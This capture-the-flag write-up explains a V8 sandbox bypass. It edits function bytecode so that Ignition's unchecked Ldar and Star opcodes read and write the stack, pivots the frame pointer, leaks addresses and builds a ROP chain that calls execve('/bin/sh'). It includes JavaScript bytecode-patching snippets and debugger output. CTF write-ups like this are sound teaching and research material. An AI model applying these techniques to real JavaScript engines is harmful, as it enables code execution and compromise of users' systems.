# Writeup for v8box

## Challenge description

In this challenge we are given arbitrary JavaScript code execution in d8. The goal is to read a flag file with an unknown name. Being able to read arbitrary files from inside v8 is not enough because we don't know where the flag file is located. Instead we have to get arbitrary code execution to get a shell and use ls to find the flag and read it.

V8 is compiled without the JavaScript and WebAssembly JITs and with the V8 sandbox and code pointer sandboxing enabled. The memory corruption API is also enabled, which lets JavaScript code read and write arbitrary data inside the JavaScript heap.

Because the V8 sandbox is enabled, having control of memory inside the sandbox doesn't directly give us arbitrary read/write everywhere in the process's memory or arbitrary code execution. The goal of this challenge is to find a bypass for the sandbox. The sandbox feature in v8 is still a work in progress and is not yet considered a security boundary so several bypasses exist.

In addition to the V8 sandbox the challenge also enables a new V8 security feature, [code pointer sandboxing](https://source.chromium.org/chromium/_/chromium/v8/v8.git/+/ee48926106051afb784d8f39c31aab0d2a04823f). Without code pointer sandboxing, code objects contain an unsandboxed pointer that is called when the code is executed. Overwriting one of these pointers is an easy way to get RIP control. With this feature, code pointers in the sandbox are replaced with indices in a code pointer table, which makes sure that all control flow transfers always jump to a valid entry point.

The challenge also introduces another patch which makes the start of every memory chunk on the V8 heap read-only. The JavaScript heap is made of a series of memory chunk, and v8 stores a number of uncompressed pointers to objects with Vtables at the beginning of each chunk. Overwriting these pointers also easily leads to code execution so in the challenge they're read-only. Unfortunately it's not possible to leave the chunk headers read-only forever because the garbage collector and other parts of the runtime occasionally need to write to them. Therefore the patch introduces some code that flips the protection bits of each page back and forth whenever the GC needs to run. Since V8 has a concurrent GC it might be possible to bypass this patch by writing to the pointers while they're temporarily writable, but the official solution takes a different approach.

## Intended solution

One of the more interesting objects that still lives inside the V8 sandbox is JavaScript bytecode. The interpreter treats bytecode as trusted, and unlike the JIT, the bytecode interpreter cannot be disabled. Ignition, V8's JavaScript interpreter defines a [large list of opcodes](https://source.chromium.org/chromium/chromium/src/+/refs/heads/main:v8/src/interpreter/bytecodes.h;l=45;drc=20911ffd8a0e1636801ddf303c17375fdedf9c83): some of these are simple operations such as loading or storing a value into the interpreter's registers, and others implement complex JavaScript operations.

Ignition holds the temporary values of the current JavaScript function in a set of "registers" whose values are stored on the stack. It also has a special "accumulator" register whose value is held in a machine register and therfore can be accessed more quickly. On x86_64, Ignition stores the value of the accumulator in rax.

Ignition defines several opcodes that move values between the accumulator and the other registers. For example [`Ldar` loads a value from a register into the accumulator](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/interpreter/interpreter-generator.cc). If we look at the implementation we can see that there are absolutely no bounds checks, so if we can control the bytecode Ldar will happily load data from anywhere on the stack:

```
pwndbg> disassemble Builtins_LdarHandler
Dump of assembler code for function Builtins_LdarHandler:
                                                                   ; r12 points to the bytecode
                                                                   ; r9 is the Ignition PC
   0x0000000000f9b740 <+0>:   movsx  rbx,BYTE PTR [r12+r9*1+0x1] ; Load the first operand
   0x0000000000f9b746 <+6>:   mov    rdx,rbp
   0x0000000000f9b749 <+9>:   mov    rbx,QWORD PTR [rdx+rbx*8]   ; Load the data from the stack
   0x0000000000f9b74d <+13>:	add    r9,0x2                      ; Dispatch the next instruction
   0x0000000000f9b751 <+17>:	movzx  edx,BYTE PTR [r9+r12*1]
   0x0000000000f9b756 <+22>:	mov    rcx,QWORD PTR [r15+rdx*8]
   0x0000000000f9b75a <+26>:	mov    rax,rbx                     ; Move the result into rax
   0x0000000000f9b75d <+29>:	jmp    rcx
   ```

Similarly the `Star` opcode [stores the accumulator value into a register](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/interpreter/interpreter-generator.cc;l=139;drc=60739af06eea138a8f9b14210878960e4f6494d1), again without any bound checks:

```
pwndbg> disassemble Builtins_StarHandler
Dump of assembler code for function Builtins_StarHandler:
                                                                   ; r12 points to the bytecode
                                                                   ; r9 is the Ignition PC
   0x0000000000f9bd00 <+0>:   movsx  ebx,BYTE PTR [r12+r9*1+0x1] ; Load the first operand
   0x0000000000f9bd06 <+6>:   mov    rdx,rbp
   0x0000000000f9bd09 <+9>:   movsxd rbx,ebx
   0x0000000000f9bd0c <+12>:	mov    QWORD PTR [rdx+rbx*8],rax   ; Store rax to the stack
   0x0000000000f9bd10 <+16>:	add    r9,0x2                      ; Dispatch the next instruction
   0x0000000000f9bd14 <+20>:	movzx  ebx,BYTE PTR [r9+r12*1]
   0x0000000000f9bd19 <+25>:	mov    rcx,QWORD PTR [r15+rbx*8]
   0x0000000000f9bd1d <+29>:	jmp    rcx
```

These two opcodes give us read/write on the stack which is more than enough to get arbitrary code execution. There is just one problem, which is that JavaScript values are only 32 bits on the heap.

When pointer compression (which is a prerequisite for heap sandboxing) is enabled, V8 stores all JavaScript values in 32 bits. There are only two types of values in the engine: a value is either a Smi (a 31-bit signed integer) or a pointer to another object on the heap. V8 distinguishes between the two types by looking at the least significant bit, which is 0 for Smis and 1 for pointers. This is a problem for us because even though we can read a 64-bit value into rax with `Ldar`, if we return that value from the function V8 will discard the top 32 bits. For example a function with this bytecode

```js
function hax1(a, b) {
    return a + b + 1;
}

// Edit hax1's bytecode
// Ldar some value
emit(0xb);
emit(0x14);
// ret
emit(0xaa);

const leak = hax1();
console.log(hex(leak));
```

and the following data on the stack

```
pwndbg> tele $rbp
00:0000│ rbp 0x7fffffffc858 —▸ 0x7fffffffc8f0 —▸ 0x7fffffffc918 —▸ 0x7fffffffc980 —▸ 0x7fffffffcad0 ◂— ...
  [....]
14:00a0│  0x7fffffffc8f8 —▸ 0x5555563a881c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
```

prints this
```
0x2b1d440e
```

which is 0x563a881c (the bottom 32-bits of the value on the stack) shifted left by 1 (because of Smi tagging).

The same problem appears with storing. We can't pass a fully-controlled 64-bit value to the interpreter in a function argument because it's either going to be a SMI (top 32 bits are 0) or a pointer (top 32 bits are set to the base of the heap sandbox). So we will have to find a way around that.

## Getting control of the stack

Even though we can't directly pass a fully controlled 64-bit value to the interpreter, we can still pass it a pointer to a JavaScript object, which will be expanded to a 64-bit pointer in the interpreter's registers. For example:

```js
function hax1(a, b) {
    return a + b + 1;
}

// Edit hax1's bytecode
// Ldar the first argument
emit(0xb);
emit(0x3);
// ret
emit(0xaa);

let obj = {};
%DebugPrint(obj);
hax1(obj);
```

```
DebugPrint: 0x3e2400047751: [JS_OBJECT_TYPE]
 - map: 0x3e2400182fc9 <Map[28](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x3e2400183115 <Object map = 0x3e24001827d1>
 - elements: 0x3e2400000219 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x3e2400000219 <FixedArray[0]>
 - All own properties (excluding elements): {}
```

```
pwndbg> tele $rbp
00:0000│ rbp 0x7fffffffc858 —▸ 0x7fffffffc8f0 —▸ 0x7fffffffc918 —▸ 0x7fffffffc980 —▸ 0x7fffffffcad0 ◂— ...
  [....]
03:0018│     0x7fffffffc870 —▸ 0x3e2400047751 ◂— 0x190000021900182f
```

We can see here that indeed the address of obj gets expanded to a full 64-bit pointer in the interpreter's registers. So even though we can't fully control the value of the register, we can still make it point to an address which we control.

One way to exploit this and get a fully controlled stack is to target the frame pointer, which is at offset 0.

```js
// Ldar the first argument
emit(0xb);
emit(3);

// star frame pointer
emit(24);
emit(0);

// ret
emit(0xaa);
hax1(obj);
```

If we run that we can see that it indeed crashes with `rbp` pointing to our object. When the function returns it will reload rsp from rbp and make rsp point to controlled memory. We can use this to make rsp point to a TypedArray which contains a ROP chain and get code execution that way.

## Getting leaks

Since we can't directly leak 64-bit values, we also can't just read a return address from the stack to figure out where in memory d8 is loaded. However the part of the address randomized by ASLR is mostly in the lower half so getting the lower 32 bits of a code pointer already gives us quite a lot of information. About 8 bits of the address are still unknown, so we can either brute force them or find some other way to leak the top bits.

In the reference exploit I used the object pointers in the chunk headers which I discussed in the challenge description. Even though we can't write to these pointers anymore, we can still read their value. These are pointers to the glibc heap, whose top 32 bits are usually the same or almost the same as the top 32 bits of d8's address. By combining these with the previous leak we can recover the full address of d8 with high reliability.

Now that we have a leak of a d8 address and control of the stack we can simply construct a ROP chain that calls execve("/bin/sh") and use the shell to solve the challenge.
